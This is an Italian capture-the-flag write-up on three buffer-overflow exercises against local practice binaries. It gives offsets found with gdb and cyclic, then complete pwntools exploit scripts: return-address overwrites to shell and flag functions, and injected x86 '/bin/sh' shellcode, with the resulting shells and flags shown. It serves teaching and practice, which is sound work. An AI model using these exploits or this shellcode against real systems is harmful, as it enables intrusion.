1)pwn1
  Osserviamo grazie a gdb intanto che siamo su in architettura a 32 bit.
  STACK:
  	.......
  	buffer[128]
  	ptr alla base
  	ind di ritorno
  	
  Cerchiamo di capire grazie al cyclic, l'offset tra inizio del buffer e l'inizio dell'indirizzo di ritorno
    cyclic -l 0x6261616b
    Finding cyclic pattern of 4 bytes: b'kaab' (hex: 0x6b616162)
    Found at offset 140
    =>dopo 140 Bytes inizia l'inidirizzo di ritorno
  
  Cerco l'indirizzo della funzione shell (gdb)
    =>0x080484ad
  
  Con questi ingredienti siamo pronti a generare il payload.
  	from pwn import *
  	p=process('./pwn1')
  	garbage=b'A'*140
  	target=p32(0x080484ad)
  	payload=garbage + target
  	p.sendline(payload)
  	p.interactive()
  
  python3 exploit.py
    [+] Starting local process './pwn1': pid 19120
    [*] Switching to interactive mode
    
    $ ls
    description.txt  flag.txt  peda-session-pwn1.txt  pwn1.c
    exploit.py     HINTS       pwn1
    $ cat flag.txt
    encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
    $  

2)hi
  Siamo in un architettura a 64 bit

  RBP
  	cyclic -l 0x6161616161616165
  	Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
  	Found at offset 32
  	
  RSP
  	cyclic -l 0x7fffffffdc48
  	Finding cyclic pattern of 8 bytes: b'H\xdc\xff\xff\xff\x7f\x00\x00' (hex: 0x48dcffffff7f0000)
  	Pattern contains characters not present in the alphabet
  	
  Queste info ci dicono che lo stack è così disposto:
  	......
  	buffer[32]
  	RBP => 8 B
  	(RSP non considerato nel payload)
  	RIP => 8B
  
  	from pwn import *
  	elf= ELF('./hi') #collegamento al file binario molto utile (dà molte funzioni)
  	p=process('./hi')
  	garbage=b'A'*40
  	target=p64(elf.symbols['print_flag'])
  	payload= garbage + target
  	p.sendline(payload)
  	print(p.recvall())
  
  	=>BTW, flag: ccit{hi_i_am_a_flag}

3)vuln
In questo esercizio non c'è una funzione utile come "target"
Dobbiamo iniettare una shellcode nella prima parte del buffer.

gdb vuln
shellcode generate
=>scelgo la versione giusta
shellcode generate x86/linux exec

shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

Ed ora abbiamo ciò che ci serve
	from pwn import *
	p=process('./vuln')
	shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
	p.sendline(shellcode)
	p.interactive()

	python3 exploit.py
	Thanks! Executing now...
	$ ls
	HINTS  README.md  description.txt  exploit.py  vuln  vuln.c
	$  



